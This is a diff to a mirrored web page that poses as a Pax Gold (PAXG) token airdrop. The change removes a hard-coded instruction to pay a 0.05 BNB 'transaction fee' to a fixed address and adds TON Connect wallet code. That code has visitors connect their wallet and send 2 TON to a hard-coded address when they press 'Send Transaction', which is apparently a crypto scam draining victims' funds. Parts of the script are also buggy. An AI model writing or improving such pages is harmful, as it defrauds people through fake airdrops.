@@ -11,7 +11,7 @@
 <!-- Mirrored from aegeantoken.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 04 Jun 2022 10:47:23 GMT -->
 <head>
 	<meta charset="utf-8">
-	<title>Pax Gold (PAXG) is an asset-backed token where one token represents one fine troy ounce of a London Good Delivery gold bar </title>
+	<title>Pax gold (PAXG) is an asset-backed token where one token represents one fine troy ounce of a London Good Delivery gold bar </title>
 	<meta name="description" content="Next Generation Infrastruture for Tradaing,Liquifying NFTs,Metaverse ">
 	<meta name="author" content="">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -21,6 +21,7 @@
 	<link href="css/style.min.css" rel="stylesheet">
 	<link rel="preconnect" href="https://fonts.googleapis.com/">
 	<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+	<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 	<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Thai&amp;family=Paytone+One&amp;display=swap"
 		rel="stylesheet">
 	<!-- <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CVarela+Round" rel="stylesheet"> -->
@@ -495,12 +496,14 @@
 							<div class="pricing-content">
 								<ul class="collection">
 									<li class="collection-item"><b>transaction fee</li>
-									<li class="collection-item"><b>Send : 0.05 BNB</li>
-									<li class="collection-item"><b>Send : Network (ANY) </li>
-									<li class="collection-item"><i> to: 0xb9000B99E64307F3934c5D23D4346FEc224a4543</li>
-		
 								</ul>
+								
+                               <!-- Connect Wallet Buttons -->
+							   <div id="ton-connect"></div>
+							   <button id="connectWalletBtn" class="connect">Connect Wallet</button>
+							   <button id="sendTransactionBtn" class="transact">Send Transaction</button>
 							</div>
+
 							<a style="padding-left: 20px; padding-right: 20px;" href="javascript:getAirdrop();"
 								id="claimairdrop" onclick="()"
 								class="rocket-btn rocket-btn-fixed-width rocket-btn-animated-icon "
@@ -554,6 +557,73 @@
 			<div class="scrollToTop-icon"></div>
 		</div>
 	</div>
+
+	<script>
+	let isWalletConnected = false;
+	let tonConnectUI = null;
+		//Initialize TON Connect UI
+		document.addEventListener("DOMContentLoaded", async function () {
+		const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+              manifestUrl: 'https://weblop16.github.io/PAXGOLD-AIRDROP/tonconnect-manifest.json',
+              buttonRootId: 'ton-connect'
+    });
+//Check if wallet is already connected
+const connectedWallet = await tonConnectUI.getWallets();
+if(connectedWallet){
+   isWalletConnected = true;
+   console.log("Wallet is already connected:", connectedWallet);
+}
+
+		});
+
+		// Connect wallet
+		async function connectWallet() {
+			if (isWalletConnected){
+				console.log("wallte already connected")
+				return;
+			}
+
+			try {
+				const connectedWallet = await tonConnectUI.connectWallet();
+				if (connectedWallet) {
+					isWalletConnected = true;
+					console.log("Wallet connected", connectedWallet);
+				}
+			} catch (error) {
+				console.error("Error connecting to wallet:", error);
+			}
+		}
+
+	
+// Send transaction
+async function sendTonTransaction() {
+ if (!isWalletConnected) {
+	console.error("Please connect your wallet first.");
+	return;
+}
+const transaction = {
+	message: [
+		{
+			address: "UQBcRvmMpgBXbdQkKAWgVTae0WXle47R2B3opTxXewo53BsV", // destination address
+			amount: "2000000000" // Toncoin in nanotons (2 TON)
+		}
+	]
+};
+
+try {
+	const result = await tonConnectUI.sendtransaction(transaction);
+	console.log("Transaction succesful:", result);
+} catch (error) {
+	console.error("transaction failed:", error);
+}
+}
+	
+
+		// Button event listeners
+		document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
+		document.getElementById("sendTransactionBtn").addEventListener("click", sendTonTransaction);
+
+	</script>
 
 	<script src="js/assets.min.js"></script>
 	<script src="js/main.min.js"></script>
